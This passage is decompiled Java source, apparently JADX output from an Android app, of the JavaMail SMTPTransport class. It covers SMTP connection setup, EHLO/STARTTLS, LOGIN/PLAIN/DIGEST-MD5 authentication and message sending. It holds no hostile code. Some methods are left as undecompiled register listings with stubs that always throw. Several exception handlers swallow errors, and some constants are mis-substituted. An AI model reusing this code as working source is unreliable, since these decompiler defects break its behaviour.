    protected SMTPTransport(Session session, URLName urlname, String name, int defaultPort, boolean isSSL) {
        boolean z = true;
        super(session, urlname);
        this.name = "smtp";
        this.defaultPort = 25;
        this.isSSL = false;
        this.sendPartiallyFailed = false;
        this.quitWait = false;
        this.saslRealm = UNKNOWN;
        if (urlname != null) {
            name = urlname.getProtocol();
        }
        this.name = name;
        this.defaultPort = defaultPort;
        this.isSSL = isSSL;
        this.out = session.getDebugOut();
        String s = session.getProperty("mail." + name + ".quitwait");
        boolean z2 = s == null || s.equalsIgnoreCase("true");
        this.quitWait = z2;
        s = session.getProperty("mail." + name + ".reportsuccess");
        if (s == null || !s.equalsIgnoreCase("true")) {
            z2 = false;
        } else {
            z2 = true;
        }
        this.reportSuccess = z2;
        s = session.getProperty("mail." + name + ".starttls.enable");
        if (s == null || !s.equalsIgnoreCase("true")) {
            z2 = false;
        } else {
            z2 = true;
        }
        this.useStartTLS = z2;
        s = session.getProperty("mail." + name + ".userset");
        if (s == null || !s.equalsIgnoreCase("true")) {
            z = false;
        }
        this.useRset = z;
    }

    public synchronized String getLocalHost() {
        try {
            if (this.localHostName == null || this.localHostName.length() <= 0) {
                this.localHostName = this.session.getProperty("mail." + this.name + ".localhost");
            }
            if (this.localHostName == null || this.localHostName.length() <= 0) {
                this.localHostName = this.session.getProperty("mail." + this.name + ".localaddress");
            }
            if (this.localHostName == null || this.localHostName.length() <= 0) {
                InetAddress localHost = InetAddress.getLocalHost();
                this.localHostName = localHost.getHostName();
                if (this.localHostName == null) {
                    this.localHostName = "[" + localHost.getHostAddress() + "]";
                }
            }
        } catch (UnknownHostException e) {
        }
        return this.localHostName;
    }

    public synchronized void setLocalHost(String localhost) {
        this.localHostName = localhost;
    }

    public synchronized void connect(Socket socket) throws MessagingException {
        this.serverSocket = socket;
        super.connect();
    }

    public synchronized String getSASLRealm() {
        if (this.saslRealm == UNKNOWN) {
            this.saslRealm = this.session.getProperty("mail." + this.name + ".sasl.realm");
            if (this.saslRealm == null) {
                this.saslRealm = this.session.getProperty("mail." + this.name + ".saslrealm");
            }
        }
        return this.saslRealm;
    }

    public synchronized void setSASLRealm(String saslRealm) {
        this.saslRealm = saslRealm;
    }

    public synchronized boolean getReportSuccess() {
        return this.reportSuccess;
    }

    public synchronized void setReportSuccess(boolean reportSuccess) {
        this.reportSuccess = reportSuccess;
    }

    public synchronized boolean getStartTLS() {
        return this.useStartTLS;
    }

    public synchronized void setStartTLS(boolean useStartTLS) {
        this.useStartTLS = useStartTLS;
    }

    public synchronized boolean getUseRset() {
        return this.useRset;
    }

    public synchronized void setUseRset(boolean useRset) {
        this.useRset = useRset;
    }

    public synchronized String getLastServerResponse() {
        return this.lastServerResponse;
    }

    public synchronized int getLastReturnCode() {
        return this.lastReturnCode;
    }

    private synchronized DigestMD5 getMD5() {
        if (this.md5support == null) {
            this.md5support = new DigestMD5(this.debug ? this.out : null);
        }
        return this.md5support;
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Missing block: B:46:0x011d, code skipped:
            if (supportsExtension("AUTH=LOGIN") != false) goto L_0x011f;
     */
    public boolean protocolConnect(java.lang.String r19, int r20, java.lang.String r21, java.lang.String r22) throws javax.mail.MessagingException {
        /*
        r18 = this;
        r0 = r18;
        r2 = r0.session;
        r3 = new java.lang.StringBuilder;
        r4 = "mail.";
        r3.<init>(r4);
        r0 = r18;
        r4 = r0.name;
        r3 = r3.append(r4);
        r4 = ".ehlo";
        r3 = r3.append(r4);
        r3 = r3.toString();
        r11 = r2.getProperty(r3);
        if (r11 == 0) goto L_0x008c;
    L_0x0023:
        r2 = "false";
        r2 = r11.equalsIgnoreCase(r2);
        if (r2 == 0) goto L_0x008c;
    L_0x002b:
        r17 = 0;
    L_0x002d:
        r0 = r18;
        r2 = r0.session;
        r3 = new java.lang.StringBuilder;
        r4 = "mail.";
        r3.<init>(r4);
        r0 = r18;
        r4 = r0.name;
        r3 = r3.append(r4);
        r4 = ".auth";
        r3 = r3.append(r4);
        r3 = r3.toString();
        r7 = r2.getProperty(r3);
        if (r7 == 0) goto L_0x008f;
    L_0x0050:
        r2 = "true";
        r2 = r7.equalsIgnoreCase(r2);
        if (r2 == 0) goto L_0x008f;
    L_0x0058:
        r16 = 1;
    L_0x005a:
        r0 = r18;
        r2 = r0.debug;
        if (r2 == 0) goto L_0x0084;
    L_0x0060:
        r0 = r18;
        r2 = r0.out;
        r3 = new java.lang.StringBuilder;
        r4 = "DEBUG SMTP: useEhlo ";
        r3.<init>(r4);
        r0 = r17;
        r3 = r3.append(r0);
        r4 = ", useAuth ";
        r3 = r3.append(r4);
        r0 = r16;
        r3 = r3.append(r0);
        r3 = r3.toString();
        r2.println(r3);
    L_0x0084:
        if (r16 == 0) goto L_0x0092;
    L_0x0086:
        if (r21 == 0) goto L_0x008a;
    L_0x0088:
        if (r22 != 0) goto L_0x0092;
    L_0x008a:
        r2 = 0;
    L_0x008b:
        return r2;
    L_0x008c:
        r17 = 1;
        goto L_0x002d;
    L_0x008f:
        r16 = 0;
        goto L_0x005a;
    L_0x0092:
        r2 = -1;
        r0 = r20;
        if (r0 != r2) goto L_0x00be;
    L_0x0097:
        r0 = r18;
        r2 = r0.session;
        r3 = new java.lang.StringBuilder;
        r4 = "mail.";
        r3.<init>(r4);
        r0 = r18;
        r4 = r0.name;
        r3 = r3.append(r4);
        r4 = ".port";
        r3 = r3.append(r4);
        r3 = r3.toString();
        r13 = r2.getProperty(r3);
        if (r13 == 0) goto L_0x01c3;
    L_0x00ba:
        r20 = java.lang.Integer.parseInt(r13);
    L_0x00be:
        if (r19 == 0) goto L_0x00c6;
    L_0x00c0:
        r2 = r19.length();
        if (r2 != 0) goto L_0x00c8;
    L_0x00c6:
        r19 = "localhost";
    L_0x00c8:
        r15 = 0;
        r0 = r18;
        r2 = r0.serverSocket;
        if (r2 == 0) goto L_0x01cb;
    L_0x00cf:
        r18.openServer();
    L_0x00d2:
        if (r17 == 0) goto L_0x00de;
    L_0x00d4:
        r2 = r18.getLocalHost();
        r0 = r18;
        r15 = r0.ehlo(r2);
    L_0x00de:
        if (r15 != 0) goto L_0x00e9;
    L_0x00e0:
        r2 = r18.getLocalHost();
        r0 = r18;
        r0.helo(r2);
    L_0x00e9:
        r0 = r18;
        r2 = r0.useStartTLS;
        if (r2 == 0) goto L_0x0105;
    L_0x00ef:
        r2 = "STARTTLS";
        r0 = r18;
        r2 = r0.supportsExtension(r2);
        if (r2 == 0) goto L_0x0105;
    L_0x00f9:
        r18.startTLS();
        r2 = r18.getLocalHost();
        r0 = r18;
        r0.ehlo(r2);
    L_0x0105:
        if (r16 != 0) goto L_0x010b;
    L_0x0107:
        if (r21 == 0) goto L_0x02d8;
    L_0x0109:
        if (r22 == 0) goto L_0x02d8;
    L_0x010b:
        r2 = "AUTH";
        r0 = r18;
        r2 = r0.supportsExtension(r2);
        if (r2 != 0) goto L_0x011f;
    L_0x0115:
        r2 = "AUTH=LOGIN";
        r0 = r18;
        r2 = r0.supportsExtension(r2);
        if (r2 == 0) goto L_0x02d8;
    L_0x011f:
        r0 = r18;
        r2 = r0.debug;
        if (r2 == 0) goto L_0x014b;
    L_0x0125:
        r0 = r18;
        r2 = r0.out;
        r3 = "DEBUG SMTP: Attempt to authenticate";
        r2.println(r3);
        r2 = "LOGIN";
        r0 = r18;
        r2 = r0.supportsAuthentication(r2);
        if (r2 != 0) goto L_0x014b;
    L_0x0138:
        r2 = "AUTH=LOGIN";
        r0 = r18;
        r2 = r0.supportsExtension(r2);
        if (r2 == 0) goto L_0x014b;
    L_0x0142:
        r0 = r18;
        r2 = r0.out;
        r3 = "DEBUG SMTP: use AUTH=LOGIN hack";
        r2.println(r3);
    L_0x014b:
        r2 = "LOGIN";
        r0 = r18;
        r2 = r0.supportsAuthentication(r2);
        if (r2 != 0) goto L_0x015f;
    L_0x0155:
        r2 = "AUTH=LOGIN";
        r0 = r18;
        r2 = r0.supportsExtension(r2);
        if (r2 == 0) goto L_0x01e7;
    L_0x015f:
        r2 = "AUTH LOGIN";
        r0 = r18;
        r14 = r0.simpleCommand(r2);
        r2 = 530; // 0x212 float:7.43E-43 double:2.62E-321;
        if (r14 != r2) goto L_0x0176;
    L_0x016b:
        r18.startTLS();
        r2 = "AUTH LOGIN";
        r0 = r18;
        r14 = r0.simpleCommand(r2);
    L_0x0176:
        r10 = new java.io.ByteArrayOutputStream;	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r10.<init>();	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r9 = new com.sun.mail.util.BASE64EncoderStream;	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r2 = 2147483647; // 0x7fffffff float:NaN double:1.060997895E-314;
        r9.m341init(r10, r2);	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r2 = 334; // 0x14e float:4.68E-43 double:1.65E-321;
        if (r14 != r2) goto L_0x019e;
    L_0x0187:
        r2 = com.sun.mail.util.ASCIIUtility.getBytes(r21);	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r9.write(r2);	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r9.flush();	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r2 = r10.toByteArray();	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r0 = r18;
        r14 = r0.simpleCommand(r2);	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r10.reset();	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
    L_0x019e:
        r2 = 334; // 0x14e float:4.68E-43 double:1.65E-321;
        if (r14 != r2) goto L_0x01b9;
    L_0x01a2:
        r2 = com.sun.mail.util.ASCIIUtility.getBytes(r22);	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r9.write(r2);	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r9.flush();	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r2 = r10.toByteArray();	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r0 = r18;
        r14 = r0.simpleCommand(r2);	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
        r10.reset();	 Catch:{ IOException -> 0x01d0, all -> 0x01db }
    L_0x01b9:
        r2 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r2) goto L_0x02d8;
    L_0x01bd:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x01c3:
        r0 = r18;
        r0 = r0.defaultPort;
        r20 = r0;
        goto L_0x00be;
    L_0x01cb:
        r18.openServer(r19, r20);
        goto L_0x00d2;
    L_0x01d0:
        r2 = move-exception;
        r2 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r2) goto L_0x02d8;
    L_0x01d5:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x01db:
        r2 = move-exception;
        r3 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r3) goto L_0x01e6;
    L_0x01e0:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x01e6:
        throw r2;
    L_0x01e7:
        r2 = "PLAIN";
        r0 = r18;
        r2 = r0.supportsAuthentication(r2);
        if (r2 == 0) goto L_0x024e;
    L_0x01f1:
        r2 = "AUTH PLAIN";
        r0 = r18;
        r14 = r0.simpleCommand(r2);
        r10 = new java.io.ByteArrayOutputStream;	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r10.<init>();	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r9 = new com.sun.mail.util.BASE64EncoderStream;	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r2 = 2147483647; // 0x7fffffff float:NaN double:1.060997895E-314;
        r9.m341init(r10, r2);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r2 = 334; // 0x14e float:4.68E-43 double:1.65E-321;
        if (r14 != r2) goto L_0x022d;
    L_0x020a:
        r2 = 0;
        r9.write(r2);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r2 = com.sun.mail.util.ASCIIUtility.getBytes(r21);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r9.write(r2);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r2 = 0;
        r9.write(r2);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r2 = com.sun.mail.util.ASCIIUtility.getBytes(r22);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r9.write(r2);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r9.flush();	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r2 = r10.toByteArray();	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
        r0 = r18;
        r14 = r0.simpleCommand(r2);	 Catch:{ IOException -> 0x0237, all -> 0x0242 }
    L_0x022d:
        r2 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r2) goto L_0x02d8;
    L_0x0231:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x0237:
        r2 = move-exception;
        r2 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r2) goto L_0x02d8;
    L_0x023c:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x0242:
        r2 = move-exception;
        r3 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r3) goto L_0x024d;
    L_0x0247:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x024d:
        throw r2;
    L_0x024e:
        r2 = "DIGEST-MD5";
        r0 = r18;
        r2 = r0.supportsAuthentication(r2);
        if (r2 == 0) goto L_0x02d8;
    L_0x0258:
        r1 = r18.getMD5();
        if (r1 == 0) goto L_0x02d8;
    L_0x025e:
        r2 = "AUTH DIGEST-MD5";
        r0 = r18;
        r14 = r0.simpleCommand(r2);
        r2 = 334; // 0x14e float:4.68E-43 double:1.65E-321;
        if (r14 != r2) goto L_0x0291;
    L_0x026a:
        r5 = r18.getSASLRealm();	 Catch:{ Exception -> 0x02a5 }
        r0 = r18;
        r6 = r0.lastServerResponse;	 Catch:{ Exception -> 0x02a5 }
        r2 = r19;
        r3 = r21;
        r4 = r22;
        r8 = r1.authClient(r2, r3, r4, r5, r6);	 Catch:{ Exception -> 0x02a5 }
        r0 = r18;
        r14 = r0.simpleCommand(r8);	 Catch:{ Exception -> 0x02a5 }
        r2 = 334; // 0x14e float:4.68E-43 double:1.65E-321;
        if (r14 != r2) goto L_0x0291;
    L_0x0286:
        r0 = r18;
        r2 = r0.lastServerResponse;	 Catch:{ Exception -> 0x02a5 }
        r2 = r1.authServer(r2);	 Catch:{ Exception -> 0x02a5 }
        if (r2 != 0) goto L_0x029b;
    L_0x0290:
        r14 = -1;
    L_0x0291:
        r2 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r2) goto L_0x02d8;
    L_0x0295:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x029b:
        r2 = 0;
        r2 = new byte[r2];	 Catch:{ Exception -> 0x02a5 }
        r0 = r18;
        r14 = r0.simpleCommand(r2);	 Catch:{ Exception -> 0x02a5 }
        goto L_0x0291;
    L_0x02a5:
        r12 = move-exception;
        r0 = r18;
        r2 = r0.debug;	 Catch:{ all -> 0x02cc }
        if (r2 == 0) goto L_0x02c2;
    L_0x02ac:
        r0 = r18;
        r2 = r0.out;	 Catch:{ all -> 0x02cc }
        r3 = new java.lang.StringBuilder;	 Catch:{ all -> 0x02cc }
        r4 = "DEBUG SMTP: DIGEST-MD5: ";
        r3.<init>(r4);	 Catch:{ all -> 0x02cc }
        r3 = r3.append(r12);	 Catch:{ all -> 0x02cc }
        r3 = r3.toString();	 Catch:{ all -> 0x02cc }
        r2.println(r3);	 Catch:{ all -> 0x02cc }
    L_0x02c2:
        r2 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r2) goto L_0x02d8;
    L_0x02c6:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x02cc:
        r2 = move-exception;
        r3 = 235; // 0xeb float:3.3E-43 double:1.16E-321;
        if (r14 == r3) goto L_0x02d7;
    L_0x02d1:
        r18.closeConnection();
        r2 = 0;
        goto L_0x008b;
    L_0x02d7:
        throw r2;
    L_0x02d8:
        r2 = 1;
        goto L_0x008b;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.sun.mail.smtp.SMTPTransport.protocolConnect(java.lang.String, int, java.lang.String, java.lang.String):boolean");
    }

    public synchronized void sendMessage(Message message, Address[] addresses) throws MessagingException, SendFailedException {
        checkConnected();
        if (message instanceof MimeMessage) {
            int i = 0;
            while (i < addresses.length) {
                if (addresses[i] instanceof InternetAddress) {
                    i++;
                } else {
                    throw new MessagingException(addresses[i] + " is not an InternetAddress");
                }
            }
            this.message = (MimeMessage) message;
            this.addresses = addresses;
            this.validUnsentAddr = addresses;
            expandGroups();
            boolean use8bit = false;
            if (message instanceof SMTPMessage) {
                use8bit = ((SMTPMessage) message).getAllow8bitMIME();
            }
            if (!use8bit) {
                String ebStr = this.session.getProperty("mail." + this.name + ".allow8bitmime");
                if (ebStr == null || !ebStr.equalsIgnoreCase("true")) {
                    use8bit = false;
                } else {
                    use8bit = true;
                }
            }
            if (this.debug) {
                this.out.println("DEBUG SMTP: use8bit " + use8bit);
            }
            if (use8bit && supportsExtension("8BITMIME") && convertTo8Bit(this.message)) {
                try {
                    this.message.saveChanges();
                } catch (MessagingException e) {
                }
            }
            try {
                mailFrom();
                rcptTo();
                this.message.writeTo(data(), ignoreList);
                finishData();
                if (this.sendPartiallyFailed) {
                    if (this.debug) {
                        this.out.println("DEBUG SMTP: Sending partially failed because of invalid destination addresses");
                    }
                    notifyTransportListeners(3, this.validSentAddr, this.validUnsentAddr, this.invalidAddr, this.message);
                    throw new SMTPSendFailedException(".", this.lastReturnCode, this.lastServerResponse, this.exception, this.validSentAddr, this.validUnsentAddr, this.invalidAddr);
                }
                notifyTransportListeners(1, this.validSentAddr, this.validUnsentAddr, this.invalidAddr, this.message);
                this.invalidAddr = null;
                this.validUnsentAddr = null;
                this.validSentAddr = null;
                this.addresses = null;
                this.message = null;
                this.exception = null;
                this.sendPartiallyFailed = false;
            } catch (MessagingException mex) {
                if (this.debug) {
                    mex.printStackTrace(this.out);
                }
                notifyTransportListeners(2, this.validSentAddr, this.validUnsentAddr, this.invalidAddr, this.message);
                throw mex;
            } catch (IOException ex) {
                if (this.debug) {
                    ex.printStackTrace(this.out);
                }
                try {
                    closeConnection();
                } catch (MessagingException e2) {
                }
                notifyTransportListeners(2, this.validSentAddr, this.validUnsentAddr, this.invalidAddr, this.message);
                throw new MessagingException("IOException while sending message", ex);
            } catch (Throwable th) {
                this.invalidAddr = null;
                this.validUnsentAddr = null;
                this.validSentAddr = null;
                this.addresses = null;
                this.message = null;
                this.exception = null;
                this.sendPartiallyFailed = false;
            }
        } else {
            if (this.debug) {
                this.out.println("DEBUG SMTP: Can only send RFC822 msgs");
            }
            throw new MessagingException("SMTP can only send RFC822 messages");
        }
    }

    public synchronized void close() throws MessagingException {
        if (super.isConnected()) {
            try {
                if (this.serverSocket != null) {
                    sendCommand("QUIT");
                    if (this.quitWait) {
                        int resp = readServerResponse();
                        if (!(resp == 221 || resp == -1)) {
                            this.out.println("DEBUG SMTP: QUIT failed with " + resp);
                        }
                    }
                }
            } finally {
                closeConnection();
            }
        }
    }

    private void closeConnection() throws MessagingException {
        try {
            if (this.serverSocket != null) {
                this.serverSocket.close();
            }
            this.serverSocket = null;
            this.serverOutput = null;
            this.serverInput = null;
            this.lineInputStream = null;
            if (super.isConnected()) {
                super.close();
            }
        } catch (IOException ioex) {
            throw new MessagingException("Server Close Failed", ioex);
        } catch (Throwable th) {
            this.serverSocket = null;
            this.serverOutput = null;
            this.serverInput = null;
            this.lineInputStream = null;
            if (super.isConnected()) {
                super.close();
            }
        }
    }

    public synchronized boolean isConnected() {
        boolean z = false;
        synchronized (this) {
            if (super.isConnected()) {
                try {
                    if (this.useRset) {
                        sendCommand("RSET");
                    } else {
                        sendCommand("NOOP");
                    }
                    int resp = readServerResponse();
                    if (resp < 0 || resp == 421) {
                        try {
                            closeConnection();
                        } catch (MessagingException e) {
                        }
                    } else {
                        z = true;
                    }
                } catch (Exception e2) {
                    try {
                        closeConnection();
                    } catch (MessagingException e3) {
                    }
                }
            }
        }
        return z;
    }

    private void expandGroups() {
        Vector groups = null;
        for (int i = 0; i < this.addresses.length; i++) {
            InternetAddress a = this.addresses[i];
            if (a.isGroup()) {
                if (groups == null) {
                    groups = new Vector();
                    for (int k = 0; k < i; k++) {
                        groups.addElement(this.addresses[k]);
                    }
                }
                try {
                    InternetAddress[] ia = a.getGroup(true);
                    if (ia != null) {
                        for (Object addElement : ia) {
                            groups.addElement(addElement);
                        }
                    } else {
                        groups.addElement(a);
                    }
                } catch (ParseException e) {
                    groups.addElement(a);
                }
            } else if (groups != null) {
                groups.addElement(a);
            }
        }
        if (groups != null) {
            InternetAddress[] newa = new InternetAddress[groups.size()];
            groups.copyInto(newa);
            this.addresses = newa;
        }
    }

    private boolean convertTo8Bit(MimePart part) {
        boolean changed = false;
        try {
            if (part.isMimeType("text/*")) {
                String enc = part.getEncoding();
                if (enc == null) {
                    return false;
                }
                if ((!enc.equalsIgnoreCase("quoted-printable") && !enc.equalsIgnoreCase("base64")) || !is8Bit(part.getInputStream())) {
                    return false;
                }
                part.setContent(part.getContent(), part.getContentType());
                part.setHeader("Content-Transfer-Encoding", "8bit");
                return true;
            } else if (!part.isMimeType("multipart/*")) {
                return false;
            } else {
                MimeMultipart mp = (MimeMultipart) part.getContent();
                int count = mp.getCount();
                for (int i = 0; i < count; i++) {
                    if (convertTo8Bit((MimePart) mp.getBodyPart(i))) {
                        changed = true;
                    }
                }
                return changed;
            }
        } catch (IOException | MessagingException e) {
            return false;
        }
    }

    private boolean is8Bit(InputStream is) {
        int linelen = 0;
        boolean need8bit = false;
        while (true) {
            try {
                int b = is.read();
                if (b >= 0) {
                    b &= MotionEventCompat.ACTION_MASK;
                    if (b == 13 || b == 10) {
                        linelen = 0;
                    } else if (b == 0) {
                        return false;
                    } else {
                        linelen++;
                        if (linelen > 998) {
                            return false;
                        }
                    }
                    if (b > 127) {
                        need8bit = true;
                    }
                } else if (!this.debug || !need8bit) {
                    return need8bit;
                } else {
                    this.out.println("DEBUG SMTP: found an 8bit part");
                    return need8bit;
                }
            } catch (IOException e) {
                return false;
            }
        }
    }

    /* access modifiers changed from: protected */
    public void finalize() throws Throwable {
        super.finalize();
        try {
            closeConnection();
        } catch (MessagingException e) {
        }
    }

    /* access modifiers changed from: protected */
    public void helo(String domain) throws MessagingException {
        if (domain != null) {
            issueCommand("HELO " + domain, 250);
        } else {
            issueCommand("HELO", 250);
        }
    }

    /* access modifiers changed from: protected */
    public boolean ehlo(String domain) throws MessagingException {
        String cmd;
        if (domain != null) {
            cmd = "EHLO " + domain;
        } else {
            cmd = "EHLO";
        }
        sendCommand(cmd);
        int resp = readServerResponse();
        if (resp == 250) {
            BufferedReader rd = new BufferedReader(new StringReader(this.lastServerResponse));
            this.extMap = new Hashtable();
            boolean first = true;
            while (true) {
                try {
                    String line = rd.readLine();
                    if (line == null) {
                        break;
                    } else if (first) {
                        first = false;
                    } else if (line.length() >= 5) {
                        line = line.substring(4);
                        int i = line.indexOf(32);
                        String arg = MMMailContentUtil.MM_MESSAGE_SUBJECT;
                        if (i > 0) {
                            arg = line.substring(i + 1);
                            line = line.substring(0, i);
                        }
                        if (this.debug) {
                            this.out.println("DEBUG SMTP: Found extension \"" + line + "\", arg \"" + arg + "\"");
                        }
                        this.extMap.put(line.toUpperCase(Locale.ENGLISH), arg);
                    }
                } catch (IOException e) {
                }
            }
        }
        if (resp == 250) {
            return true;
        }
        return false;
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Removed duplicated region for block: B:50:0x0166  */
    /* JADX WARNING: Removed duplicated region for block: B:18:0x0050  */
    public void mailFrom() throws javax.mail.MessagingException {
        /*
        r12 = this;
        r4 = 0;
        r9 = r12.message;
        r9 = r9 instanceof com.sun.mail.smtp.SMTPMessage;
        if (r9 == 0) goto L_0x000f;
    L_0x0007:
        r9 = r12.message;
        r9 = (com.sun.mail.smtp.SMTPMessage) r9;
        r4 = r9.getEnvelopeFrom();
    L_0x000f:
        if (r4 == 0) goto L_0x0017;
    L_0x0011:
        r9 = r4.length();
        if (r9 > 0) goto L_0x0034;
    L_0x0017:
        r9 = r12.session;
        r10 = new java.lang.StringBuilder;
        r11 = "mail.";
        r10.<init>(r11);
        r11 = r12.name;
        r10 = r10.append(r11);
        r11 = ".from";
        r10 = r10.append(r11);
        r10 = r10.toString();
        r4 = r9.getProperty(r10);
    L_0x0034:
        if (r4 == 0) goto L_0x003c;
    L_0x0036:
        r9 = r4.length();
        if (r9 > 0) goto L_0x0056;
    L_0x003c:
        r9 = r12.message;
        if (r9 == 0) goto L_0x015e;
    L_0x0040:
        r9 = r12.message;
        r3 = r9.getFrom();
        if (r3 == 0) goto L_0x015e;
    L_0x0048:
        r9 = r3.length;
        if (r9 <= 0) goto L_0x015e;
    L_0x004b:
        r9 = 0;
        r5 = r3[r9];
    L_0x004e:
        if (r5 == 0) goto L_0x0166;
    L_0x0050:
        r5 = (javax.mail.internet.InternetAddress) r5;
        r4 = r5.getAddress();
    L_0x0056:
        r9 = new java.lang.StringBuilder;
        r10 = "MAIL FROM:";
        r9.<init>(r10);
        r10 = r12.normalizeAddress(r4);
        r9 = r9.append(r10);
        r0 = r9.toString();
        r9 = "DSN";
        r9 = r12.supportsExtension(r9);
        if (r9 == 0) goto L_0x00b8;
    L_0x0071:
        r6 = 0;
        r9 = r12.message;
        r9 = r9 instanceof com.sun.mail.smtp.SMTPMessage;
        if (r9 == 0) goto L_0x0080;
    L_0x0078:
        r9 = r12.message;
        r9 = (com.sun.mail.smtp.SMTPMessage) r9;
        r6 = r9.getDSNRet();
    L_0x0080:
        if (r6 != 0) goto L_0x009f;
    L_0x0082:
        r9 = r12.session;
        r10 = new java.lang.StringBuilder;
        r11 = "mail.";
        r10.<init>(r11);
        r11 = r12.name;
        r10 = r10.append(r11);
        r11 = ".dsn.ret";
        r10 = r10.append(r11);
        r10 = r10.toString();
        r6 = r9.getProperty(r10);
    L_0x009f:
        if (r6 == 0) goto L_0x00b8;
    L_0x00a1:
        r9 = new java.lang.StringBuilder;
        r10 = java.lang.String.valueOf(r0);
        r9.<init>(r10);
        r10 = " RET=";
        r9 = r9.append(r10);
        r9 = r9.append(r6);
        r0 = r9.toString();
    L_0x00b8:
        r9 = "AUTH";
        r9 = r12.supportsExtension(r9);
        if (r9 == 0) goto L_0x010b;
    L_0x00c0:
        r8 = 0;
        r9 = r12.message;
        r9 = r9 instanceof com.sun.mail.smtp.SMTPMessage;
        if (r9 == 0) goto L_0x00cf;
    L_0x00c7:
        r9 = r12.message;
        r9 = (com.sun.mail.smtp.SMTPMessage) r9;
        r8 = r9.getSubmitter();
    L_0x00cf:
        if (r8 != 0) goto L_0x00ee;
    L_0x00d1:
        r9 = r12.session;
        r10 = new java.lang.StringBuilder;
        r11 = "mail.";
        r10.<init>(r11);
        r11 = r12.name;
        r10 = r10.append(r11);
        r11 = ".submitter";
        r10 = r10.append(r11);
        r10 = r10.toString();
        r8 = r9.getProperty(r10);
    L_0x00ee:
        if (r8 == 0) goto L_0x010b;
    L_0x00f0:
        r7 = xtext(r8);	 Catch:{ IllegalArgumentException -> 0x016e }
        r9 = new java.lang.StringBuilder;	 Catch:{ IllegalArgumentException -> 0x016e }
        r10 = java.lang.String.valueOf(r0);	 Catch:{ IllegalArgumentException -> 0x016e }
        r9.<init>(r10);	 Catch:{ IllegalArgumentException -> 0x016e }
        r10 = " AUTH=";
        r9 = r9.append(r10);	 Catch:{ IllegalArgumentException -> 0x016e }
        r9 = r9.append(r7);	 Catch:{ IllegalArgumentException -> 0x016e }
        r0 = r9.toString();	 Catch:{ IllegalArgumentException -> 0x016e }
    L_0x010b:
        r2 = 0;
        r9 = r12.message;
        r9 = r9 instanceof com.sun.mail.smtp.SMTPMessage;
        if (r9 == 0) goto L_0x011a;
    L_0x0112:
        r9 = r12.message;
        r9 = (com.sun.mail.smtp.SMTPMessage) r9;
        r2 = r9.getMailExtension();
    L_0x011a:
        if (r2 != 0) goto L_0x0139;
    L_0x011c:
        r9 = r12.session;
        r10 = new java.lang.StringBuilder;
        r11 = "mail.";
        r10.<init>(r11);
        r11 = r12.name;
        r10 = r10.append(r11);
        r11 = ".mailextension";
        r10 = r10.append(r11);
        r10 = r10.toString();
        r2 = r9.getProperty(r10);
    L_0x0139:
        if (r2 == 0) goto L_0x0158;
    L_0x013b:
        r9 = r2.length();
        if (r9 <= 0) goto L_0x0158;
    L_0x0141:
        r9 = new java.lang.StringBuilder;
        r10 = java.lang.String.valueOf(r0);
        r9.<init>(r10);
        r10 = " ";
        r9 = r9.append(r10);
        r9 = r9.append(r2);
        r0 = r9.toString();
    L_0x0158:
        r9 = 250; // 0xfa float:3.5E-43 double:1.235E-321;
        r12.issueSendCommand(r0, r9);
        return;
    L_0x015e:
        r9 = r12.session;
        r5 = javax.mail.internet.InternetAddress.getLocalAddress(r9);
        goto L_0x004e;
    L_0x0166:
        r9 = new javax.mail.MessagingException;
        r10 = "can't determine local email address";
        r9.m403init(r10);
        throw r9;
    L_0x016e:
        r1 = move-exception;
        r9 = r12.debug;
        if (r9 == 0) goto L_0x010b;
    L_0x0173:
        r9 = r12.out;
        r10 = new java.lang.StringBuilder;
        r11 = "DEBUG SMTP: ignoring invalid submitter: ";
        r10.<init>(r11);
        r10 = r10.append(r8);
        r11 = ", Exception: ";
        r10 = r10.append(r11);
        r10 = r10.append(r1);
        r10 = r10.toString();
